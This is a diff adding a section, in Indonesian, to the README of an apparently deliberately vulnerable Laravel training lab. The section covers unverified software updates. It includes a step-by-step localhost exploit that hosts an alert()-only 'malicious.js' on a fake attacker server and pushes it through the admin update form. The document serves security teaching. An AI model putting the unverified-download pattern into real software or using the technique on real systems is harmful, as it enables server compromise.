@@ -124,6 +124,67 @@ A07:2021 - Authentication Failures
         Hasil: Sistem menerima kata sandi yang sangat lemah.
     Remediasi: Lihat branch main. Gunakan aturan password yang kuat, seperti yang disediakan oleh Rules\Password::defaults(), yang memerlukan panjang, kombinasi huruf besar/kecil, angka, dan simbol.
 
+A08:2025 - Software or Data Integrity Failures
+
+1. Software Update Without Verification
+
+    Lokasi: app/Http/Controllers/AdminController.php (metode performUpdate).
+    Deskripsi: Fitur pembaruan perangkat lunak mengunduh file dari URL yang diberikan admin tanpa melakukan verifikasi integritas. Aplikasi tidak memeriksa tanda tangan digital atau memastikan sumber URL terpercaya. Ini memungkinkan penyerang untuk menyuntikkan kode berbahaya ke dalam server dengan membujuk admin untuk mengunduh update dari URL yang telah dikendalikan.
+    PoC / Eksploitasi:
+    Seorang penyerang meng-host file berbahaya (misalnya JavaScript) di servernya.
+    Penyerang membujuk admin untuk mengakses halaman update dan memasukkan URL berbahaya tersebut.
+    Aplikasi mengunduh file tersebut dan menyimpannya di public/updates/latest_version.js.
+    Penyerang sekarang bisa mengakses file berbahaya tersebut langsung dari server KUTUBUKU, yang bisa digunakan untuk serangan lanjutan (misalnya Stored XSS).
+    Remediasi: Lihat branch main. Jangan pernah mengunduh dan menjalankan file dari sumber yang tidak tepercaya. Gunakan mekanisme verifikasi yang kuat seperti tanda tangan digital (digital signature). Aplikasi hanya boleh mengunduh update dari URL tepercaya dan harus memverifikasi signature file tersebut menggunakan kunci publik sebelum menggunakannya.
+
+2. Panduan Eksploitasi Langkah demi Langkah (untuk Localhost)
+
+    Berikut adalah cara mendemonstrasikan kerentanan ini di lingkungan localhost Anda.
+    Bagian 1: Menyiapkan Server Penyerang Palsu
+    Kita akan membuat server palsu di komputer yang sama untuk menyimulasikan serangan.
+    Buat Folder "Penyerang":
+    Buka File Explorer.
+    Navigasi ke C:\laragon\www.
+    Buat folder baru bernama attacker-server.
+    Buat File Berbahaya:
+    Di dalam folder C:\laragon\www\attacker-server, buat file baru bernama malicious.js.
+    Buka file tersebut dan isi dengan kode JavaScript berikut:
+    javascript
+    // Kode ini akan menampilkan pesan peringatan saat dijalankan
+    alert('SERANGAN BERHASIL! Kode berbahaya telah dijalankan dari server KUTUBUKU.');
+    Hidupkan Server Penyerang:
+    Buka terminal baru yang terpisah.
+    Jalankan perintah ini untuk masuk ke folder penyerang:
+    bash
+    cd C:\laragon\www\attacker-server
+    Jalankan server PHP di port 8001:
+    bash
+    php -S localhost:8001
+    Biarkan terminal ini terbuka. Server penyerang Anda sekarang aktif di http://localhost:8001.
+    Bagian 2: Melakukan Serangan ke Aplikasi KUTUBUKU
+    Sekarang kita akan menyerang aplikasi utama.
+    Pastikan Aplikasi KUTUBUKU Berjalan:
+    Di terminal lain, pastikan server KUTUBUKU aktif dengan php artisan serve.
+    Login sebagai Admin:
+    Buka browser dan login ke aplikasi KUTUBUKU sebagai admin.
+    Buka Halaman Update:
+    Akses URL: http://127.0.0.1:8000/admin/update.
+    Masukkan URL Berbahaya:
+    Di form "URL Update", masukkan URL dari server penyerang palsu yang baru Anda buat:
+    http://localhost:8001/malicious.js
+    Jalankan Update:
+    Klik tombol "Unduh dan Terapkan Update".
+    Anda akan melihat pesan sukses: Update berhasil diunduh ke /updates/latest_version.js.
+    Bagian 3: Verifikasi Hasil Eksploitasi
+    Ini adalah langkah pembuktian bahwa serangan berhasil.
+    Akses File yang Telah Dicuri:
+    Buka tab baru di browser.
+    Kunjungi URL file yang baru saja diunduh, tetapi dari server KUTUBUKU, bukan dari server penyerang:
+    http://127.0.0.1:8000/updates/latest_version.js
+    Lihat Hasilnya:
+    Di halaman tersebut, Anda akan melihat kode JavaScript berbahaya Anda yang sekarang tersimpan dan di-hosting oleh server KUTUBUKU.
+    Ini membuktikan bahwa server KUTUBUKU telah berhasil dieksploitasi untuk menyimpan file berbahaya. Penyerang sekarang bisa menggunakan file ini untuk melancarkan serangan lebih lanjut.
+
 Cara Menggunakan Lab Ini
 
     Pastikan Anda berada di branch staging (git checkout staging).
